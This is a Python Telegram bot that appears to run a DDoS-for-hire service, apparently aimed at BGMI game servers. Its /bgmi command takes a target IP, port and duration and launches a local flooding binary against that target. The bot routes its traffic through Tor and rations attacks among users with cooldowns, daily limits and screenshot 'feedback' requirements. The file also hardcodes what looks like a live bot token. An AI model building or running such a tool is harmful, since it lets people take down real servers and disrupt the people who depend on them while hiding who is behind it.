# === SOCKS5 Proxy Setup for Tor ===
import requests
from telebot import apihelper

proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}
apihelper.proxy = proxies

import telebot
import logging
import asyncio
from datetime import datetime, timedelta, timezone

# Logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Bot token and channel ID
TOKEN = '7848878988:AAFTJ3MezVw2zDcJVytY6tLySNEHOqGnNg4'
CHANNEL_ID = '-1002678249799'
bot = telebot.TeleBot(TOKEN)

user_attacks = {}
user_cooldowns = {}
user_photos = {}
user_bans = {}
active_attackers = set()
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)

COOLDOWN_DURATION = 60
BAN_DURATION = timedelta(minutes=1)
DAILY_ATTACK_LIMIT = 15
EXEMPTED_USERS = [5712886230]

def reset_daily_counts():
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)

def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    user_photos[user_id] = True
    bot.send_message(message.chat.id, "✅ Feedback received! You can use /bgmi again.")

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global user_attacks, user_cooldowns, user_photos, user_bans
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, "This bot is not authorized to be used here.")
        return

    reset_daily_counts()

    if user_id in user_bans:
        ban_expiry = user_bans[user_id]
        if datetime.now() < ban_expiry:
            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
            minutes, seconds = divmod(remaining_ban_time, 60)
            bot.send_message(message.chat.id, f"🫣You are banned. Please wait {int(minutes)}m {int(seconds)}s \n\n REASON : NOT PROVING SCREENSHOT.")
            return
        else:
            del user_bans[user_id]

    if user_id not in EXEMPTED_USERS:
        if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
            remaining_time = (user_cooldowns[user_id] - datetime.now()).seconds
            bot.send_message(message.chat.id, f"You're on cooldown. Wait {remaining_time}s.")
            return

        if user_id not in user_attacks:
            user_attacks[user_id] = 0

        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
            bot.send_message(message.chat.id, "Daily limit reached.")
            return

        if user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
            user_bans[user_id] = datetime.now() + BAN_DURATION
            bot.send_message(message.chat.id, "‼️Feedback not received. Banned for 1 minute.")
            return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            raise ValueError(" ┊★ȺŁØNɆ☂࿐ꔪ┊™ Bot Active✅!

Usage format: /bgmi <ip> <port> <duration>")

        ip, port, dur = args
        if not is_valid_ip(ip): raise ValueError("Invalid IP.")
        if not is_valid_port(port): raise ValueError("Invalid port.")
        if not is_valid_duration(dur): raise ValueError("Invalid duration.")
        if int(dur) > 240: raise ValueError("Max duration is 240s.")

        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] += 1
            user_photos[user_id] = False
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        bot.send_message(message.chat.id, f"""Attack started🚀

IP: {ip}
Port: {port}
Time: {dur}s

📸Send feedback (a photo) once done!""")

        if user_id not in EXEMPTED_USERS and len(active_attackers) >= 3 and user_id not in active_attackers:
            bot.send_message(message.chat.id, "❣️Currently 3 users are attacking. Please wait one of them to complete.")
            return
        active_attackers.add(user_id)

        asyncio.run(run_attack_command_async(ip, int(port), int(dur), dur, user_name, user_id))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))

async def run_attack_command_async(ip, port, duration, user_duration, user_name, user_id):
    try:
        command = f"./fuck {ip} {port} {duration}"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        bot.send_message(CHANNEL_ID, f"""Attack Finished 😈

IP: {ip}
Port: {port}
Duration: {user_duration}sec""")
    except Exception as e:
        bot.send_message(CHANNEL_ID, f"Error: {e}")
    finally:
        active_attackers.discard(user_id)

if __name__ == "__main__":
    logging.info("Bot is starting...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling crashed: {e}")
